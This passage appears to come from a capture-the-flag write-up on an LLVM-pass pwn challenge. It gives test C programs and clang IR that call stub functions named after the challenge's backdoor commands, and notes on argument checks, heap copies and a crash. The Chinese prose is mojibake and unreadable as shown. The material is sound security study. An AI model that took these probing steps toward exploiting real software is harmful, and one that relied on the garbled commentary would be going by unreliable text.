<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [7 x i8] c&quot;123456\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [7 x i8] c&quot;654321\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [7 x i8] c&quot;abcdef\00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [7 x i8] c&quot;fedcba\00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [7 x i8] c&quot;888888\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @takeaway() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @stealkey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @fakekey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @run() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @B4ckDo0r() #0 &#123;</span><br><span class="line">  %1 = alloca i32, align 4</span><br><span class="line">  store i32 0, i32* %1, align 4</span><br><span class="line">  call void @save()</span><br><span class="line">  call void @takeaway()</span><br><span class="line">  call void @stealkey()</span><br><span class="line">  call void @fakekey()</span><br><span class="line">  call void @run()</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;clang version 10.0.0-4ubuntu1 &quot;&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨éå†åˆ°B4ckDo0rå‡½æ•°çš„saveå‡½æ•°è°ƒç”¨æ—¶ï¼Œå‘ç°æœ‰ä¸€ä¸ªåˆ¤æ–­æ¡ä»¶é€šä¸è¿‡ï¼š<br />
<code>if ( -1431655765 * (unsigned int)((v15 + 24 * v18 - 24 * (unsigned __int64)NumTotalBundleOperands - v20) &gt;&gt; 3) == 2 )</code></p>
<p>æ¨æµ‹æ˜¯å‡½æ•°è¿”å›å€¼æˆ–å‚æ•°ç±»å‹ä¸åŒ¹é…çš„é—®é¢˜ï¼Œäºæ˜¯å¼€å§‹äº†é•¿æ—¶é—´çš„è°ƒè¯•å’Œä¿®æ”¹ã€‚</p>
<p>è¿™é‡Œå‘ç°ä½¿ç”¨clang-10ç”Ÿæˆçš„.llæ–‡ä»¶ä¸¢åˆ°opté‡Œé¢ä¼šæŠ¥é”™ï¼Œæœ¬é¢˜ä½¿ç”¨çš„clangç‰ˆæœ¬ä¸ºclang-8ï¼Œè§£å†³æ–¹æ³•æ˜¯ï¼š<code>apt install clang-8</code>ï¼Œç„¶åä½¿ç”¨clang-8ç”Ÿæˆ.llæ–‡ä»¶ã€‚</p>
<p>ç»è¿‡è°ƒè¯•å‘ç°ï¼Œä¸Šé¢çš„ä¸€é•¿ä¸²è¯­å¥çš„ç­‰å·å·¦è¾¹å€¼ä¸ºå‡½æ•°çš„å‚æ•°ä¸ªæ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œsaveå‡½æ•°éœ€è¦æœ‰ä¸¤ä¸ªå‚æ•°ã€‚äºæ˜¯æˆ‘ä»¬æœ‰äº†ç¬¬äºŒä¸ªæµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">	save(<span class="string">&quot;follow&quot;</span>, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">	takeaway();</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey();</span><br><span class="line">	run();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [7 x i8] c&quot;123456\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [7 x i8] c&quot;654321\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [7 x i8] c&quot;abcdef\00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [7 x i8] c&quot;fedcba\00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [7 x i8] c&quot;888888\00&quot;, align 1</span><br><span class="line">@.str.5 = private unnamed_addr constant [7 x i8] c&quot;follow\00&quot;, align 1</span><br><span class="line">@.str.6 = private unnamed_addr constant [11 x i8] c&quot;helloworld\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save(i8*, i8*) #0 &#123;</span><br><span class="line">  %3 = alloca i8*, align 8</span><br><span class="line">  %4 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %3, align 8</span><br><span class="line">  store i8* %1, i8** %4, align 8</span><br><span class="line">  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @takeaway() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @stealkey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @fakekey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @run() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @B4ckDo0r() #0 &#123;</span><br><span class="line">  call void @save(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0))</span><br><span class="line">  call void @takeaway()</span><br><span class="line">  call void @stealkey()</span><br><span class="line">  call void @fakekey()</span><br><span class="line">  call void @run()</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;clang version 8.0.1-9 (tags/RELEASE_801/final)&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>ç»è¿‡è°ƒè¯•å‘ç°ï¼Œå¯¹äºä¸Šé¢æœ‰ä¸¤ä¸ªå‚æ•°çš„saveå‡½æ•°ï¼Œ.soåº“ä¸­çš„æ–¹æ³•å°†å…¶ä¼ å…¥çš„å‡½æ•°çš„ä¸¤ä¸ªå®å‚çš„å†…å®¹æ‹·è´åˆ°äº†ä¸€ä¸ªchunkä¸­ï¼Œè¿™æ˜¯ä¸¤ä¸ªmemcpyå‡½æ•°å¹²çš„äº‹æƒ…ã€‚ä¹‹åçš„ä¸¤ä¸ªåˆ¤æ–­æ¡ä»¶ä¹Ÿæ˜¯ç›´æ¥ç»•è¿‡ï¼Œæ²¡æœ‰æ‰§è¡Œdeleteã€‚</p>
<p>è€Œç¬¬äºŒæ¡è°ƒç”¨takeawayçš„è¯­å¥çš„è¯†åˆ«ä¸­ï¼Œä¹Ÿæœ‰ä¸€ä¸ªå…³äºå‚æ•°ä¸ªæ•°çš„åˆ¤æ–­ï¼š<br />
<code>if ( -1431655765 * (unsigned int)((v15 + 24 * v38 - 24 * (unsigned __int64)v39 - v40) &gt;&gt; 3) != 1 )</code><br />
è®¾ç½®å…¶æœ‰ä¸€ä¸ªå‚æ•°å³å¯é€šè¿‡è¯¥æ£€æŸ¥ã€‚</p>
<p>äºæ˜¯æœ‰ç¬¬ä¸‰ä¸ªæµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">(<span class="type">char</span>* a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">	save(<span class="string">&quot;follow&quot;</span>, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">	takeaway(<span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey();</span><br><span class="line">	run();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [7 x i8] c&quot;123456\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [7 x i8] c&quot;654321\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [7 x i8] c&quot;abcdef\00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [7 x i8] c&quot;fedcba\00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [7 x i8] c&quot;888888\00&quot;, align 1</span><br><span class="line">@.str.5 = private unnamed_addr constant [7 x i8] c&quot;follow\00&quot;, align 1</span><br><span class="line">@.str.6 = private unnamed_addr constant [11 x i8] c&quot;helloworld\00&quot;, align 1</span><br><span class="line">@.str.7 = private unnamed_addr constant [6 x i8] c&quot;colin\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save(i8*, i8*) #0 &#123;</span><br><span class="line">  %3 = alloca i8*, align 8</span><br><span class="line">  %4 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %3, align 8</span><br><span class="line">  store i8* %1, i8** %4, align 8</span><br><span class="line">  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @takeaway(i8*) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @stealkey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @fakekey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @run() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @B4ckDo0r() #0 &#123;</span><br><span class="line">  call void @save(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0))</span><br><span class="line">  call void @takeaway(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0))</span><br><span class="line">  call void @stealkey()</span><br><span class="line">  call void @fakekey()</span><br><span class="line">  call void @run()</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;clang version 8.0.1-9 (tags/RELEASE_801/final)&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿›å…¥è°ƒè¯•åå‘ç°åœ¨takeawayä¸­æŸå¤„ä¼šäº§ç”Ÿæ®µé”™è¯¯ï¼ŒåŸå› ä¸æ˜ã€‚æš‚ä¸”åˆ é™¤takeawayçš„è°ƒç”¨ï¼Œè·³è¿‡ã€‚</p>
